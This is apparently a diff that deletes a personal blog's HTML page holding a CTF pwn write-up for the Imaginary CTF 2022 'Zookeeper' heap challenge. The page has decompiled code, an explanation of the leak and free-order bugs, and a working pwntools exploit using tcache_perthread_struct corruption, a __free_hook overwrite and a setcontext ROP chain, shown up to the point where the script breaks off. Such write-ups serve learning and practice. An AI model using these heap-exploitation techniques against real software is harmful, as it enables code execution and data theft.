@@ -1,579 +1,368 @@
-<!DOCTYPE html>
-<html lang="en">
-
-    <head>		<title>Imaginary Ctf 2022 Pwn Writeup &ndash; piers&#39;s blog</title>
-		<meta name="description" content="My personal blog on the journey of learning how2pwn">
-		<link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
-		<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-		<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-		<link rel="manifest" href="/site.webmanifest">
-		<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-		<meta name="msapplication-TileColor" content="#da532c">
-		<meta name="theme-color" content="#ffffff">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<meta charset="utf-8"/>
-
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
-
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
-
-		
-		<link rel="stylesheet" href="https://piers-n.github.io/css/colour/gruvbox-dark.css">
-		<link rel="stylesheet" href="https://piers-n.github.io/css/colour/dark-mode.css">
-		<link rel="stylesheet" href="https://piers-n.github.io/css/risotto.css">
-		<link rel="stylesheet" href="https://piers-n.github.io/css/custom.css">
-</head>
-
-    <body>
-        <div class="page">
-
-            <header class="page__header"><h1 class="page__logo"><a href="https://piers-n.github.io/" class="page__logo-inner">piers&#39;s blog</a></h1>
-<nav class="page__nav main-nav">
-    <ul>
-    
-    
-    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
-    
-    <li class="main-nav__item"><a class="nav-main-item active" href="/post/" title="Posts">Posts</a></li>
-    
-    </ul>
-</nav>
-
-</header>
-
-            <section class="page__body">
-    <header class="content__header">
-        <h1>Imaginary Ctf 2022 Pwn Writeup</h1>
-    </header>
-    <div class="content__body">
-        <p>My team purf3ct cleared the pwn section of this ctf, so for the first time, I feel qualifed enough to make a writeup about 2 heap challenges, which introduce some nice heap exploitation techniques</p>
-<h2 id="lfyg-zookeeper-lfyg"><lf><yg> Zookeeper </lf></yg></h2>
-<p><img src="/images/zookeeper/checksec_zookeeper.png" alt="checksec"><br>
-The binary is running with GLIBC-2.31.</p>
-<h3 id="lfyg-looking-for-vulnerabilities-lfyg"><lf><yg> Looking for vulnerabilities </lf></yg></h3>
-<p>Let&rsquo;s look into IDA decompilation.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx_; <span style="color:#75715e">// ebx
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  struct_zoo <span style="color:#f92672">*</span>ptr; <span style="color:#75715e">// rbx
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> choice; <span style="color:#75715e">// [rsp+3h] [rbp-1Dh] BYREF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> idx; <span style="color:#75715e">// [rsp+4h] [rbp-1Ch] BYREF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
-</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Are you fit to be the keeper of the zoo?&#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
-</span></span><span style="display:flex;"><span>      {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
-</span></span><span style="display:flex;"><span>        {
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(f)ind a lion&#34;</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(l)ose a lion&#34;</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(v)iew a lion&#34;</span>);
-</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#e6db74">&#34;%c%*c&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;f&#39;</span> )
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;idx:&#34;</span>);
-</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>          idx_ <span style="color:#f92672">=</span> idx;
-</span></span><span style="display:flex;"><span>          array[idx_] <span style="color:#f92672">=</span> (struct_zoo <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x50uLL</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;len:&#34;</span>);
-</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, array[idx]);
-</span></span><span style="display:flex;"><span>          ptr <span style="color:#f92672">=</span> array[idx];
-</span></span><span style="display:flex;"><span>          ptr<span style="color:#f92672">-&gt;</span>content <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)malloc(SLODWORD(ptr<span style="color:#f92672">-&gt;</span>len));
-</span></span><span style="display:flex;"><span>          strcpy(array[idx]<span style="color:#f92672">-&gt;</span>token, <span style="color:#e6db74">&#34;valid management&#34;</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;content:&#34;</span>);
-</span></span><span style="display:flex;"><span>          read(<span style="color:#ae81ff">0</span>, array[idx]<span style="color:#f92672">-&gt;</span>content, SLODWORD(array[idx]<span style="color:#f92672">-&gt;</span>len));
-</span></span><span style="display:flex;"><span>          array[idx]<span style="color:#f92672">-&gt;</span>content[SLODWORD(array[idx]<span style="color:#f92672">-&gt;</span>len) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;l&#39;</span> )
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;idx:&#34;</span>);
-</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>          exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( strncmp(array[idx]<span style="color:#f92672">-&gt;</span>token, <span style="color:#e6db74">&#34;valid management&#34;</span>, <span style="color:#ae81ff">0x10uLL</span>) )
-</span></span><span style="display:flex;"><span>          exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        free(array[idx]);
-</span></span><span style="display:flex;"><span>        free(array[idx]<span style="color:#f92672">-&gt;</span>content);
-</span></span><span style="display:flex;"><span>        array[idx] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
-</span></span><span style="display:flex;"><span>      }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;v&#39;</span> );
-</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;idx:&#34;</span>);
-</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( strncmp(array[idx]<span style="color:#f92672">-&gt;</span>token, <span style="color:#e6db74">&#34;valid management&#34;</span>, <span style="color:#ae81ff">0x10uLL</span>) )
-</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    puts(array[idx]<span style="color:#f92672">-&gt;</span>content);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>It&rsquo;s a very typical looking heap challenge with these functionalities: malloc, free, and view<br>
-And there is a struct_zoo:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>struct_zoo {
-</span></span><span style="display:flex;"><span>    _QWORD len;  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> content;  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> token[<span style="color:#ae81ff">16</span>];  
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Looking through it, we can immediately see this line:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, array[idx]<span style="color:#f92672">-&gt;</span>content, SLODWORD(array[idx]<span style="color:#f92672">-&gt;</span>len));
-</span></span></code></pre></div><p>Combined with the view function, we can easily leak libc address through unsorted bin, and also heap address through tcache. <code>We have already achieved a info-leak</code><br>
-There is also another very subtle bug laying in the free function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>free(array[idx]);
-</span></span><span style="display:flex;"><span>free(array[idx]<span style="color:#f92672">-&gt;</span>content);  
-</span></span></code></pre></div><p>The chunk is freed before the actual content inside the chunk get freed. What can we achieve with this?<br>
-Well, when a chunk get freed, there is a fd and bk pointer get placed at the first 16 bytes of the chunk<br>
-<img src="/images/zookeeper/free_chunk1.png" alt="free_chunk"><br>
-The bk pointer is actually pointing to a large chunk at the beginning, the tcache_perthread_struct:<br>
-<img src="/images/zookeeper/chunk2.png" alt="chunk2"><br>
-Looking at the zoo_struct we can see that the bk pointer perfectly aligns with the content pointer. Thus, we can free the tcache_perthread_struct, and then malloc a chunk with 0x290 size to overwrite that struct. What can we do with this?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> tcache_perthread_struct
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> counts[TCACHE_MAX_BINS];<span style="color:#75715e">//0x40
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  tcache_entry <span style="color:#f92672">*</span>entries[TCACHE_MAX_BINS];<span style="color:#75715e">//0x40
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} tcache_perthread_struct; 
-</span></span></code></pre></div><p>The tcache freelist is structured as a doubly-linked list. And the entries array contains the head of each doubly-linked list with each tcache size.<br>
-<img src="/images/zookeeper/tcache_struct.png" alt="tcache_struct"><br>
-Those heap pointer is the head pointer of each list. So if we can overwrite those entries, we can control malloc to return an arbitrary pointer of our control.<br>
-However, there is the existence of seccomp:<br>
-<img src="/images/zookeeper/seccomp.png" alt="seccomp"><br>
-We cannot just overwrite __free_hook with one_gadget, but there is this well documented technique for orw capability. You can read more about it <a href="https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/">here</a></p>
-<h3 id="lfyg-my-messy-exploit-script-lfyg"><lf><yg> My messy exploit script </lf></yg></h3>
-<p><code>I shamelessly copied from the blog above</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln_patched&#34;</span>)
-</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
-</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.31.so&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#r = gdb.debug(&#34;./vuln_patched&#34;)</span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;zookeeper.chal.imaginaryctf.org&#34;</span>,<span style="color:#ae81ff">1337</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new</span>(idx,sz,content):
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;(v)iew a lion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#39;f&#39;</span>)
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;idx:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx))
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;len:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(sz))
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;content:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,content)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;(v)iew a lion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#39;l&#39;</span>)
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;idx:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;(v)iew a lion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#39;v&#39;</span>)
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;idx:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx))
-</span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x20</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>view(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recvline()[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
-</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1b61</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;HEAP LEAK: &#34;</span> <span style="color:#f92672">+</span> hex(heap_leak))
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;HEAP BASE: &#34;</span> <span style="color:#f92672">+</span> hex(heap_base))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x430</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>view(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recvline()[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
-</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span>libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebc61</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC LEAK: &#34;</span> <span style="color:#f92672">+</span> hex(libc_leak))
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE ADDRESS: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = 1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b72</span>
-</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x27529</span>
-</span></span><span style="display:flex;"><span>pop_rdx_r12 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x11c371</span>
-</span></span><span style="display:flex;"><span>push_rax <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45197</span>
-</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4a550</span>
-</span></span><span style="display:flex;"><span>xchg_eax_edi <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2ad2b</span>
-</span></span><span style="display:flex;"><span>syscall_ret <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x66229</span>
-</span></span><span style="display:flex;"><span>call_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x154930</span>
-</span></span><span style="display:flex;"><span>setcontext_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x580DD</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">5</span>)
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">0x290</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>,p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">15</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]))
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0x10</span>,p64(call_gadget))
-</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2390</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>                  <span style="color:#75715e"># &lt;-- [rdi] &lt;-- payload_base</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(base)              <span style="color:#75715e"># &lt;-- [rdi + 8] = rdx</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>              <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(setcontext_gadget) <span style="color:#75715e"># &lt;-- [rdx + 0x20]</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x28] = r8</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x30] = r9</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>              <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x48] = r12</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x50] = r13</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x58] = r14</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x60] = r15</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x158</span>)      <span style="color:#75715e"># &lt;-- [rdx + 0x68] = rdi (ptr to flag path)</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x70] = rsi (flag = O_RDONLY)</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x78] = rbp</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x80] = rbx</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x88] = rdx </span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>                 <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># &lt;-- [rdx + 0x98] = rcx </span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb0</span>)      <span style="color:#75715e"># &lt;-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)           <span style="color:#75715e"># &lt;-- [rdx + 0xa8] = rcx, will be pushed to rsp</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall_ret) <span style="color:#75715e"># sys_open(&#34;/path/to/flag&#34;, O_RDONLY)</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(xchg_eax_edi)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x15000</span>) <span style="color:#75715e"># destination buffer, can be anywhere readable and writable</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x100</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># nbytes</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall_ret) <span style="color:#75715e"># sys_read(eax, heap + 0x15000, 0x100)</span>
